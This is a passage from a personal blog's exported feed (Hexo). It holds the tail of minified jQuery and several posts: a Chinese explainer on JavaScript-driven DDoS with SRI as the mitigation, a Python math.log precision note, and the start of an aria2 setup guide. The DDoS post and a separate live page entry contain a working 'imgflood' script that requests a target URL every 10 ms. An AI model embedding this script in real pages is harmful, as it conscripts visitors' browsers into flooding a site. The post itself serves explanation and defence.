c,y,v,w,T,N=n;2!==b&&(b=2,s&&clearTimeout(s),u=t,a=i||"",C.readyState=e>0?4:0,c=e>=200&&300>e||304===e,r&&(w=Mn(p,C,r)),w=On(p,w,C,c),c?(p.ifModified&&(T=C.getResponseHeader("Last-Modified"),T&&(x.lastModified[o]=T),T=C.getResponseHeader("etag"),T&&(x.etag[o]=T)),204===e||"HEAD"===p.type?N="nocontent":304===e?N="notmodified":(N=w.state,y=w.data,v=w.error,c=!v)):(v=N,(e||!N)&&(N="error",0>e&&(e=0))),C.status=e,C.statusText=(n||N)+"",c?h.resolveWith(f,[y,N,C]):h.rejectWith(f,[C,N,v]),C.statusCode(m),m=t,l&&d.trigger(c?"ajaxSuccess":"ajaxError",[C,p,c?y:v]),g.fireWith(f,[C,N]),l&&(d.trigger("ajaxComplete",[C,p]),--x.active||x.event.trigger("ajaxStop")))}return C},getJSON:function(e,t,n){return x.get(e,t,n,"json")},getScript:function(e,n){return x.get(e,t,n,"script")}}),x.each(["get","post"],function(e,n){x[n]=function(e,r,i,o){return x.isFunction(r)&&(o=o||i,i=r,r=t),x.ajax({url:e,type:n,dataType:o,data:r,success:i})}});function Mn(e,n,r){var i,o,a,s,l=e.contents,u=e.dataTypes;while("*"===u[0])u.shift(),o===t&&(o=e.mimeType||n.getResponseHeader("Content-Type"));if(o)for(s in l)if(l[s]&&l[s].test(o)){u.unshift(s);break}if(u[0]in r)a=u[0];else{for(s in r){if(!u[0]||e.converters[s+" "+u[0]]){a=s;break}i||(i=s)}a=a||i}return a?(a!==u[0]&&u.unshift(a),r[a]):t}function On(e,t,n,r){var i,o,a,s,l,u={},c=e.dataTypes.slice();if(c[1])for(a in e.converters)u[a.toLowerCase()]=e.converters[a];o=c.shift();while(o)if(e.responseFields[o]&&(n[e.responseFields[o]]=t),!l&&r&&e.dataFilter&&(t=e.dataFilter(t,e.dataType)),l=o,o=c.shift())if("*"===o)o=l;else if("*"!==l&&l!==o){if(a=u[l+" "+o]||u["* "+o],!a)for(i in u)if(s=i.split(" "),s[1]===o&&(a=u[l+" "+s[0]]||u["* "+s[0]])){a===!0?a=u[i]:u[i]!==!0&&(o=s[0],c.unshift(s[1]));break}if(a!==!0)if(a&&e["throws"])t=a(t);else try{t=a(t)}catch(p){return{state:"parsererror",error:a?p:"No conversion from "+l+" to "+o}}}return{state:"success",data:t}}x.ajaxSetup({accepts:{script:"text/javascript, application/javascript, application/ecmascript, application/x-ecmascript"},contents:{script:/(?:java|ecma)script/},converters:{"text script":function(e){return x.globalEval(e),e}}}),x.ajaxPrefilter("script",function(e){e.cache===t&&(e.cache=!1),e.crossDomain&&(e.type="GET",e.global=!1)}),x.ajaxTransport("script",function(e){if(e.crossDomain){var n,r=a.head||x("head")[0]||a.documentElement;return{send:function(t,i){n=a.createElement("script"),n.async=!0,e.scriptCharset&&(n.charset=e.scriptCharset),n.src=e.url,n.onload=n.onreadystatechange=function(e,t){(t||!n.readyState||/loaded|complete/.test(n.readyState))&&(n.onload=n.onreadystatechange=null,n.parentNode&&n.parentNode.removeChild(n),n=null,t||i(200,"success"))},r.insertBefore(n,r.firstChild)},abort:function(){n&&n.onload(t,!0)}}}});var Fn=[],Bn=/(=)\?(?=&|$)|\?\?/;x.ajaxSetup({jsonp:"callback",jsonpCallback:function(){var e=Fn.pop()||x.expando+"_"+vn++;return this[e]=!0,e}}),x.ajaxPrefilter("json jsonp",function(n,r,i){var o,a,s,l=n.jsonp!==!1&&(Bn.test(n.url)?"url":"string"==typeof n.data&&!(n.contentType||"").indexOf("application/x-www-form-urlencoded")&&Bn.test(n.data)&&"data");return l||"jsonp"===n.dataTypes[0]?(o=n.jsonpCallback=x.isFunction(n.jsonpCallback)?n.jsonpCallback():n.jsonpCallback,l?n[l]=n[l].replace(Bn,"$1"+o):n.jsonp!==!1&&(n.url+=(bn.test(n.url)?"&":"?")+n.jsonp+"="+o),n.converters["script json"]=function(){return s||x.error(o+" was not called"),s[0]},n.dataTypes[0]="json",a=e[o],e[o]=function(){s=arguments},i.always(function(){e[o]=a,n[o]&&(n.jsonpCallback=r.jsonpCallback,Fn.push(o)),s&&x.isFunction(a)&&a(s[0]),s=a=t}),"script"):t});var Pn,Rn,Wn=0,$n=e.ActiveXObject&&function(){var e;for(e in Pn)Pn[e](t,!0)};function In(){try{return new e.XMLHttpRequest}catch(t){}}function zn(){try{return new e.ActiveXObject("Microsoft.XMLHTTP")}catch(t){}}x.ajaxSettings.xhr=e.ActiveXObject?function(){return!this.isLocal&&In()||zn()}:In,Rn=x.ajaxSettings.xhr(),x.support.cors=!!Rn&&"withCredentials"in Rn,Rn=x.support.ajax=!!Rn,Rn&&x.ajaxTransport(function(n){if(!n.crossDomain||x.support.cors){var r;return{send:function(i,o){var a,s,l=n.xhr();if(n.username?l.open(n.type,n.url,n.async,n.username,n.password):l.open(n.type,n.url,n.async),n.xhrFields)for(s in n.xhrFields)l[s]=n.xhrFields[s];n.mimeType&&l.overrideMimeType&&l.overrideMimeType(n.mimeType),n.crossDomain||i["X-Requested-With"]||(i["X-Requested-With"]="XMLHttpRequest");try{for(s in i)l.setRequestHeader(s,i[s])}catch(u){}l.send(n.hasContent&&n.data||null),r=function(e,i){var s,u,c,p;try{if(r&&(i||4===l.readyState))if(r=t,a&&(l.onreadystatechange=x.noop,$n&&delete Pn[a]),i)4!==l.readyState&&l.abort();else{p={},s=l.status,u=l.getAllResponseHeaders(),"string"==typeof l.responseText&&(p.text=l.responseText);try{c=l.statusText}catch(f){c=""}s||!n.isLocal||n.crossDomain?1223===s&&(s=204):s=p.text?200:404}}catch(d){i||o(-1,d)}p&&o(s,c,p,u)},n.async?4===l.readyState?setTimeout(r):(a=++Wn,$n&&(Pn||(Pn={},x(e).unload($n)),Pn[a]=r),l.onreadystatechange=r):r()},abort:function(){r&&r(t,!0)}}}});var Xn,Un,Vn=/^(?:toggle|show|hide)$/,Yn=RegExp("^(?:([+-])=|)("+w+")([a-z%]*)$","i"),Jn=/queueHooks$/,Gn=[nr],Qn={"*":[function(e,t){var n=this.createTween(e,t),r=n.cur(),i=Yn.exec(t),o=i&&i[3]||(x.cssNumber[e]?"":"px"),a=(x.cssNumber[e]||"px"!==o&&+r)&&Yn.exec(x.css(n.elem,e)),s=1,l=20;if(a&&a[3]!==o){o=o||a[3],i=i||[],a=+r||1;do s=s||".5",a/=s,x.style(n.elem,e,a+o);while(s!==(s=n.cur()/r)&&1!==s&&--l)}return i&&(a=n.start=+a||+r||0,n.unit=o,n.end=i[1]?a+(i[1]+1)*i[2]:+i[2]),n}]};function Kn(){return setTimeout(function(){Xn=t}),Xn=x.now()}function Zn(e,t,n){var r,i=(Qn[t]||[]).concat(Qn["*"]),o=0,a=i.length;for(;a>o;o++)if(r=i[o].call(n,t,e))return r}function er(e,t,n){var r,i,o=0,a=Gn.length,s=x.Deferred().always(function(){delete l.elem}),l=function(){if(i)return!1;var t=Xn||Kn(),n=Math.max(0,u.startTime+u.duration-t),r=n/u.duration||0,o=1-r,a=0,l=u.tweens.length;for(;l>a;a++)u.tweens[a].run(o);return s.notifyWith(e,[u,o,n]),1>o&&l?n:(s.resolveWith(e,[u]),!1)},u=s.promise({elem:e,props:x.extend({},t),opts:x.extend(!0,{specialEasing:{}},n),originalProperties:t,originalOptions:n,startTime:Xn||Kn(),duration:n.duration,tweens:[],createTween:function(t,n){var r=x.Tween(e,u.opts,t,n,u.opts.specialEasing[t]||u.opts.easing);return u.tweens.push(r),r},stop:function(t){var n=0,r=t?u.tweens.length:0;if(i)return this;for(i=!0;r>n;n++)u.tweens[n].run(1);return t?s.resolveWith(e,[u,t]):s.rejectWith(e,[u,t]),this}}),c=u.props;for(tr(c,u.opts.specialEasing);a>o;o++)if(r=Gn[o].call(u,e,c,u.opts))return r;return x.map(c,Zn,u),x.isFunction(u.opts.start)&&u.opts.start.call(e,u),x.fx.timer(x.extend(l,{elem:e,anim:u,queue:u.opts.queue})),u.progress(u.opts.progress).done(u.opts.done,u.opts.complete).fail(u.opts.fail).always(u.opts.always)}function tr(e,t){var n,r,i,o,a;for(n in e)if(r=x.camelCase(n),i=t[r],o=e[n],x.isArray(o)&&(i=o[1],o=e[n]=o[0]),n!==r&&(e[r]=o,delete e[n]),a=x.cssHooks[r],a&&"expand"in a){o=a.expand(o),delete e[r];for(n in o)n in e||(e[n]=o[n],t[n]=i)}else t[r]=i}x.Animation=x.extend(er,{tweener:function(e,t){x.isFunction(e)?(t=e,e=["*"]):e=e.split(" ");var n,r=0,i=e.length;for(;i>r;r++)n=e[r],Qn[n]=Qn[n]||[],Qn[n].unshift(t)},prefilter:function(e,t){t?Gn.unshift(e):Gn.push(e)}});function nr(e,t,n){var r,i,o,a,s,l,u=this,c={},p=e.style,f=e.nodeType&&nn(e),d=x._data(e,"fxshow");n.queue||(s=x._queueHooks(e,"fx"),null==s.unqueued&&(s.unqueued=0,l=s.empty.fire,s.empty.fire=function(){s.unqueued||l()}),s.unqueued++,u.always(function(){u.always(function(){s.unqueued--,x.queue(e,"fx").length||s.empty.fire()})})),1===e.nodeType&&("height"in t||"width"in t)&&(n.overflow=[p.overflow,p.overflowX,p.overflowY],"inline"===x.css(e,"display")&&"none"===x.css(e,"float")&&(x.support.inlineBlockNeedsLayout&&"inline"!==ln(e.nodeName)?p.zoom=1:p.display="inline-block")),n.overflow&&(p.overflow="hidden",x.support.shrinkWrapBlocks||u.always(function(){p.overflow=n.overflow[0],p.overflowX=n.overflow[1],p.overflowY=n.overflow[2]}));for(r in t)if(i=t[r],Vn.exec(i)){if(delete t[r],o=o||"toggle"===i,i===(f?"hide":"show"))continue;c[r]=d&&d[r]||x.style(e,r)}if(!x.isEmptyObject(c)){d?"hidden"in d&&(f=d.hidden):d=x._data(e,"fxshow",{}),o&&(d.hidden=!f),f?x(e).show():u.done(function(){x(e).hide()}),u.done(function(){var t;x._removeData(e,"fxshow");for(t in c)x.style(e,t,c[t])});for(r in c)a=Zn(f?d[r]:0,r,u),r in d||(d[r]=a.start,f&&(a.end=a.start,a.start="width"===r||"height"===r?1:0))}}function rr(e,t,n,r,i){return new rr.prototype.init(e,t,n,r,i)}x.Tween=rr,rr.prototype={constructor:rr,init:function(e,t,n,r,i,o){this.elem=e,this.prop=n,this.easing=i||"swing",this.options=t,this.start=this.now=this.cur(),this.end=r,this.unit=o||(x.cssNumber[n]?"":"px")},cur:function(){var e=rr.propHooks[this.prop];return e&&e.get?e.get(this):rr.propHooks._default.get(this)},run:function(e){var t,n=rr.propHooks[this.prop];return this.pos=t=this.options.duration?x.easing[this.easing](e,this.options.duration*e,0,1,this.options.duration):e,this.now=(this.end-this.start)*t+this.start,this.options.step&&this.options.step.call(this.elem,this.now,this),n&&n.set?n.set(this):rr.propHooks._default.set(this),this}},rr.prototype.init.prototype=rr.prototype,rr.propHooks={_default:{get:function(e){var t;return null==e.elem[e.prop]||e.elem.style&&null!=e.elem.style[e.prop]?(t=x.css(e.elem,e.prop,""),t&&"auto"!==t?t:0):e.elem[e.prop]},set:function(e){x.fx.step[e.prop]?x.fx.step[e.prop](e):e.elem.style&&(null!=e.elem.style[x.cssProps[e.prop]]||x.cssHooks[e.prop])?x.style(e.elem,e.prop,e.now+e.unit):e.elem[e.prop]=e.now}}},rr.propHooks.scrollTop=rr.propHooks.scrollLeft={set:function(e){e.elem.nodeType&&e.elem.parentNode&&(e.elem[e.prop]=e.now)}},x.each(["toggle","show","hide"],function(e,t){var n=x.fn[t];x.fn[t]=function(e,r,i){return null==e||"boolean"==typeof e?n.apply(this,arguments):this.animate(ir(t,!0),e,r,i)}}),x.fn.extend({fadeTo:function(e,t,n,r){return this.filter(nn).css("opacity",0).show().end().animate({opacity:t},e,n,r)},animate:function(e,t,n,r){var i=x.isEmptyObject(e),o=x.speed(t,n,r),a=function(){var t=er(this,x.extend({},e),o);(i||x._data(this,"finish"))&&t.stop(!0)};return a.finish=a,i||o.queue===!1?this.each(a):this.queue(o.queue,a)},stop:function(e,n,r){var i=function(e){var t=e.stop;delete e.stop,t(r)};return"string"!=typeof e&&(r=n,n=e,e=t),n&&e!==!1&&this.queue(e||"fx",[]),this.each(function(){var t=!0,n=null!=e&&e+"queueHooks",o=x.timers,a=x._data(this);if(n)a[n]&&a[n].stop&&i(a[n]);else for(n in a)a[n]&&a[n].stop&&Jn.test(n)&&i(a[n]);for(n=o.length;n--;)o[n].elem!==this||null!=e&&o[n].queue!==e||(o[n].anim.stop(r),t=!1,o.splice(n,1));(t||!r)&&x.dequeue(this,e)})},finish:function(e){return e!==!1&&(e=e||"fx"),this.each(function(){var t,n=x._data(this),r=n[e+"queue"],i=n[e+"queueHooks"],o=x.timers,a=r?r.length:0;for(n.finish=!0,x.queue(this,e,[]),i&&i.stop&&i.stop.call(this,!0),t=o.length;t--;)o[t].elem===this&&o[t].queue===e&&(o[t].anim.stop(!0),o.splice(t,1));for(t=0;a>t;t++)r[t]&&r[t].finish&&r[t].finish.call(this);delete n.finish})}});function ir(e,t){var n,r={height:e},i=0;for(t=t?1:0;4>i;i+=2-t)n=Zt[i],r["margin"+n]=r["padding"+n]=e;return t&&(r.opacity=r.width=e),r}x.each({slideDown:ir("show"),slideUp:ir("hide"),slideToggle:ir("toggle"),fadeIn:{opacity:"show"},fadeOut:{opacity:"hide"},fadeToggle:{opacity:"toggle"}},function(e,t){x.fn[e]=function(e,n,r){return this.animate(t,e,n,r)}}),x.speed=function(e,t,n){var r=e&&"object"==typeof e?x.extend({},e):{complete:n||!n&&t||x.isFunction(e)&&e,duration:e,easing:n&&t||t&&!x.isFunction(t)&&t};return r.duration=x.fx.off?0:"number"==typeof r.duration?r.duration:r.duration in x.fx.speeds?x.fx.speeds[r.duration]:x.fx.speeds._default,(null==r.queue||r.queue===!0)&&(r.queue="fx"),r.old=r.complete,r.complete=function(){x.isFunction(r.old)&&r.old.call(this),r.queue&&x.dequeue(this,r.queue)},r},x.easing={linear:function(e){return e},swing:function(e){return.5-Math.cos(e*Math.PI)/2}},x.timers=[],x.fx=rr.prototype.init,x.fx.tick=function(){var e,n=x.timers,r=0;for(Xn=x.now();n.length>r;r++)e=n[r],e()||n[r]!==e||n.splice(r--,1);n.length||x.fx.stop(),Xn=t},x.fx.timer=function(e){e()&&x.timers.push(e)&&x.fx.start()},x.fx.interval=13,x.fx.start=function(){Un||(Un=setInterval(x.fx.tick,x.fx.interval))},x.fx.stop=function(){clearInterval(Un),Un=null},x.fx.speeds={slow:600,fast:200,_default:400},x.fx.step={},x.expr&&x.expr.filters&&(x.expr.filters.animated=function(e){return x.grep(x.timers,function(t){return e===t.elem}).length}),x.fn.offset=function(e){if(arguments.length)return e===t?this:this.each(function(t){x.offset.setOffset(this,e,t)});var n,r,o={top:0,left:0},a=this[0],s=a&&a.ownerDocument;if(s)return n=s.documentElement,x.contains(n,a)?(typeof a.getBoundingClientRect!==i&&(o=a.getBoundingClientRect()),r=or(s),{top:o.top+(r.pageYOffset||n.scrollTop)-(n.clientTop||0),left:o.left+(r.pageXOffset||n.scrollLeft)-(n.clientLeft||0)}):o},x.offset={setOffset:function(e,t,n){var r=x.css(e,"position");"static"===r&&(e.style.position="relative");var i=x(e),o=i.offset(),a=x.css(e,"top"),s=x.css(e,"left"),l=("absolute"===r||"fixed"===r)&&x.inArray("auto",[a,s])>-1,u={},c={},p,f;l?(c=i.position(),p=c.top,f=c.left):(p=parseFloat(a)||0,f=parseFloat(s)||0),x.isFunction(t)&&(t=t.call(e,n,o)),null!=t.top&&(u.top=t.top-o.top+p),null!=t.left&&(u.left=t.left-o.left+f),"using"in t?t.using.call(e,u):i.css(u)}},x.fn.extend({position:function(){if(this[0]){var e,t,n={top:0,left:0},r=this[0];return"fixed"===x.css(r,"position")?t=r.getBoundingClientRect():(e=this.offsetParent(),t=this.offset(),x.nodeName(e[0],"html")||(n=e.offset()),n.top+=x.css(e[0],"borderTopWidth",!0),n.left+=x.css(e[0],"borderLeftWidth",!0)),{top:t.top-n.top-x.css(r,"marginTop",!0),left:t.left-n.left-x.css(r,"marginLeft",!0)}}},offsetParent:function(){return this.map(function(){var e=this.offsetParent||s;while(e&&!x.nodeName(e,"html")&&"static"===x.css(e,"position"))e=e.offsetParent;return e||s})}}),x.each({scrollLeft:"pageXOffset",scrollTop:"pageYOffset"},function(e,n){var r=/Y/.test(n);x.fn[e]=function(i){return x.access(this,function(e,i,o){var a=or(e);return o===t?a?n in a?a[n]:a.document.documentElement[i]:e[i]:(a?a.scrollTo(r?x(a).scrollLeft():o,r?o:x(a).scrollTop()):e[i]=o,t)},e,i,arguments.length,null)}});function or(e){return x.isWindow(e)?e:9===e.nodeType?e.defaultView||e.parentWindow:!1}x.each({Height:"height",Width:"width"},function(e,n){x.each({padding:"inner"+e,content:n,"":"outer"+e},function(r,i){x.fn[i]=function(i,o){var a=arguments.length&&(r||"boolean"!=typeof i),s=r||(i===!0||o===!0?"margin":"border");return x.access(this,function(n,r,i){var o;return x.isWindow(n)?n.document.documentElement["client"+e]:9===n.nodeType?(o=n.documentElement,Math.max(n.body["scroll"+e],o["scroll"+e],n.body["offset"+e],o["offset"+e],o["client"+e])):i===t?x.css(n,r,s):x.style(n,r,i,s)},n,a?i:t,a,null)}})}),x.fn.size=function(){return this.length},x.fn.andSelf=x.fn.addBack,"object"==typeof module&&module&&"object"==typeof module.exports?module.exports=x:(e.jQuery=e.$=x,"function"==typeof define&&define.amd&&define("jquery",[],function(){return x}))})(window);</div></body></html></iframe></table></$1></"+e.nodename+"></$1></([\w:]+)></(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:]+)[^></(?:"+ht+")[\\s></31,l={}.hasownproperty,h=[],q=h.pop,_=h.push,m=h.push,o=h.slice,f=h.indexof||function(e){var></"===e.charat(0)&&"></\></(\w+)\s*\></[\w\w]+>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2019/12/12/DDoS-Javascript/fuck/"/>
      <url>/2019/12/12/DDoS-Javascript/fuck/</url>
      
        <content type="html"><![CDATA[<head><meta name="generator" content="Hexo 3.8.0"><!--<script type='text/javascript'>function imgflood(){//var TARGET = 'victim-website.com'var TARGET = "127.0.0.1:12345"var URI = '/index?'var pic = new Image()var rand = Math.floor(Math.random()*1000)pic.src = 'http://'+TARGET+URI+rand+'=val'//pic.src = 'http://'+TARGET+URI+'val='+rand}setInterval(imgflood, 10)alert(pic.src)</script>--></head><body>f*********************king<script type="text/javascript">function imgflood(){//var TARGET = 'victim-website.com'var TARGET = "127.0.0.1:12345"var URI = '/index?'var pic = new Image()var rand = Math.floor(Math.random()*1000)pic.src = 'http://'+TARGET+URI+rand+'=val'//pic.src = 'http://'+TARGET+URI+'val='+rand}setInterval(imgflood, 10)alert(pic.src)</script></body>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>DDoS-JavaScript</title>
      <link href="/2019/12/12/DDoS-Javascript/"/>
      <url>/2019/12/12/DDoS-Javascript/</url>
      
        <content type="html"><![CDATA[<h1 id="关于JavaScript的DDoS攻击"><a href="#关于JavaScript的DDoS攻击" class="headerlink" title="关于JavaScript的DDoS攻击"></a>关于JavaScript的DDoS攻击</h1><blockquote><p>引用：</p><p><a href="https://www.freebuf.com/news/66447.html" target="_blank" rel="noopener">https://www.freebuf.com/news/66447.html</a></p></blockquote><h3 id="该攻击属于应用层攻击"><a href="#该攻击属于应用层攻击" class="headerlink" title="该攻击属于应用层攻击"></a>该攻击属于应用层攻击</h3><ul><li><strong>Javascript实现DDos攻击原理分析</strong></li></ul><blockquote><p>　　现在网站的交互性都是通过JavaScript来实现的。通过添加JavaScript直接插入HTML元素，或通过远程来加载JavaScript。浏览器会读取script标签中的src属性并运行它所指向的脚本，其实不只是script标签可以用来攻击，简单来说只要是可以跨域访问的标签，如img，link等都可以实现DDos攻击。</p><p>　　既然这些标签可以访问外站的资源，那么我们是不是就可以设个定时器无限访问这个网站，从而达到攻击呢，那是肯定的。</p></blockquote><p><img src="/2019/12/12/DDoS-Javascript/1.jpg"></p><p>如果攻击者在一个网站中嵌入了恶意JavaScript脚本，那么该网站的每一个访客都将成为DDoS攻击中的一员。网站流量越高就意味着DDoS越严重。</p><p><strong>入侵共享JavaScript的第三方服务器</strong></p><p>许多网站使用的都是普通的JavaScript库，为了节约带宽、提升性能，通常还会将JavaScript脚本共享在第三方服务器上。也就是说如果网站上包含有指向第三方服务器的脚本标签，就意味着所有访问该网站的用户都将自动下载JavaScript脚本，并执行。不幸的是，如果攻击者入侵了该第三方服务器并在JavaScript脚本中注入了DDoS攻击代码，那结果可想而知了，所有的访客也将变成DDoS攻击中的一员。</p><p>一段简单的JS代码就能发起DoS攻击</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script type=<span class="string">'text/javascript'</span>&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">imgflood</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="comment">//var TARGET = 'victim-website.com'</span></span><br><span class="line"><span class="keyword">var</span> TARGET = <span class="string">"127.0.0.1:12345"</span></span><br><span class="line"><span class="keyword">var</span> URI = <span class="string">'/index?'</span></span><br><span class="line"><span class="keyword">var</span> pic = <span class="keyword">new</span> Image()</span><br><span class="line"><span class="keyword">var</span> rand = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random()*<span class="number">1000</span>)</span><br><span class="line">pic.src = <span class="string">'http://'</span>+TARGET+URI+<span class="string">'val='</span>+rand</span><br><span class="line"><span class="comment">//pic.src = 'http://'+TARGET+URI+'val='+rand</span></span><br><span class="line">&#125;</span><br><span class="line">setInterval(imgflood, <span class="number">10</span>)</span><br><span class="line">alert(pic.src)</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">f*********************king</span><br><span class="line">&lt;script type=<span class="string">'text/javascript'</span>&gt;imgflood()&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>body&gt;</span><br></pre></td></tr></table></figure><p><code>setInterval(code, millisec)</code>:以millisec 毫秒的间隔执行code</p><p>由于大部分网页引用jquery是从外部引用的，因此可以从此发起中间人攻击</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://code.jquery.com/jquery-1.10.2.min.js"</span>&gt;</span><span class="undefined"></span></span><br></pre></td></tr></table></figure><p>预防的话，就是通过script标签支持的属性integrity：这个属性支持验证该js脚本的hash值，确保不会引用来自外部恶意的js脚本</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://code.jquery.com/jquery-1.10.2.min.js"</span>  </span></span><br><span class="line"><span class="tag">        <span class="attr">integrity</span>=<span class="string">"sha256-C6CB9UYIS9UJeqinPHWTHVqh/E1uhG5Twh+Y5qFQmYg="</span></span></span><br><span class="line"><span class="tag">         <span class="attr">crossorigin</span>=<span class="string">"anonymous"</span>&gt;</span><span class="undefined"></span></span><br></pre></td></tr></table></figure><p>中间人攻击示意图：攻击其中的请求外部js的途径</p><p><img src="/2019/12/12/DDoS-Javascript/2.jpg" alt></p><hr><p><strong>在写js-DDoS的问题</strong>：</p><h4 id="HTML引入外部js脚本，放在head中不起作用-放在body中才起作用"><a href="#HTML引入外部js脚本，放在head中不起作用-放在body中才起作用" class="headerlink" title="HTML引入外部js脚本，放在head中不起作用,放在body中才起作用"></a><a href="https://blog.csdn.net/SeekAndFindYou/article/details/82219815" target="_blank" rel="noopener">HTML引入外部js脚本，放在head中不起作用,放在body中才起作用</a></h4><p>这是因为加载HTML文档时，先加载了js脚本后就不起作用了。<br>一般引入外部css文件放在head中，引入外部js脚本放在body中。<br>先渲染HTML文档(css)，再加载特效(js)</p>]]></content>
      
      
      <categories>
          
          <category> DDoS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Network </tag>
            
            <tag> DDoS </tag>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tricks</title>
      <link href="/2019/12/01/tricks/"/>
      <url>/2019/12/01/tricks/</url>
      
        <content type="html"><![CDATA[<h1 id="To-record-some-strange-tricks"><a href="#To-record-some-strange-tricks" class="headerlink" title="To record some strange tricks"></a>To record some strange tricks</h1><h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><h5 id="1-something-about-math-log"><a href="#1-something-about-math-log" class="headerlink" title="1.something about math.log"></a>1.something about math.log</h5><p>如图，当math.log(125,5)时应该值为3的，但是出了一个bug</p><p><img src="/2019/12/01/tricks/1.jpg" alt></p><p>好奇心驱使我去写一个脚本看看，然后发现这些能hack math.log函数的不在少数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,<span class="number">101</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">ij = i**j</span><br><span class="line">        <span class="keyword">if</span> math.log(ij, i) != j:</span><br><span class="line">            print(i,<span class="string">'\t'</span>,j)</span><br></pre></td></tr></table></figure><p>然后去ubuntu虚拟机尝试了python2，发现也有这个问题</p><p><img src="/2019/12/01/tricks/2.jpg" alt></p><p>看了官方文档，发现有底数的对数函数是通过换底公式实现的，统一换成以e为底的对数去计算，因此会有除法的溢出导致以上问题。</p><blockquote><ul><li><p><code>math.`</code>log`(<em>x</em>[, <em>base</em>]) </p><p>With one argument, return the natural logarithm of <em>x</em> (to base  <em>e</em>). With two arguments, return the logarithm of <em>x</em> to the given  <em>base</em>, calculated as <code>log(x)/log(base)</code>.</p></li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">math.log(x[,base]) = log(x) / log(base)</span><br></pre></td></tr></table></figure><p>哪怕是<code>math.log(x**y,x)</code>也会有这个问题。</p><p>最有力的证明：</p><p><img src="/2019/12/01/tricks/3.jpg" alt></p><hr>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>aria2</title>
      <link href="/2019/11/27/aria2/"/>
      <url>/2019/11/27/aria2/</url>
      
        <content type="html"><![CDATA[<h1 id="Aria2"><a href="#Aria2" class="headerlink" title="Aria2"></a>Aria2</h1><blockquote><p>参考：</p><p><a href="http://aria2.github.io/" target="_blank" rel="noopener">aria2</a></p><p><a href="http://aria2.github.io/manual/en/html/aria2c.html" target="_blank" rel="noopener">aria2 manual</a></p><p><a href="https://github.com/aria2/aria2" target="_blank" rel="noopener">github-aria2</a> </p><p><a href="https://zhuanlan.zhihu.com/p/21831960" target="_blank" rel="noopener">Windows 下如何配置 Aria 2</a></p><p><a href="https://www.htcp.net/3664.html" target="_blank" rel="noopener">AriaNg 强大的 Aria2 Web 端 安装及使用</a></p></blockquote><blockquote><p>webui配置：</p><p><a href="http://aria2c.com/usage.html" target="_blank" rel="noopener">YAAW</a></p><p> <a href="http://ariang.mayswind.net/zh_Hans/" target="_blank" rel="noopener">AriaNg</a></p></blockquote><p>由于不想下载可爱的迅雷，于是搜索搜索就得到了这个下载工具——Aria2</p><p>这东西不仅可以当作下载器，而且可以支持各种协议，包括bt等等</p><h2 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h2><p>1.进入官方页面 <a href="https://aria2.github.io/" target="_blank" rel="noopener">Aria2</a>，也可以去官方github的项目地址 <a href="https://github.com/aria2/aria2/releases/tag/release-1.35.0" target="_blank" rel="noopener">https://github.com/aria2/aria2/releases/tag/release-1.35.0</a> 下载release包，也可以下源码自己编译。</p><p>2.下载之后解压至目录下，然后再该目录下新建以下4个文件</p><blockquote><ul><li>Aria2.log：日志，空文件即可</li><li>aria2.session：下载历史，空文件即可</li><li>aria2.conf：配置文件</li><li>run.bat or run.vbs：用于自动启动或隐藏窗口，可选</li></ul></blockquote><p>Aria2.conf如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 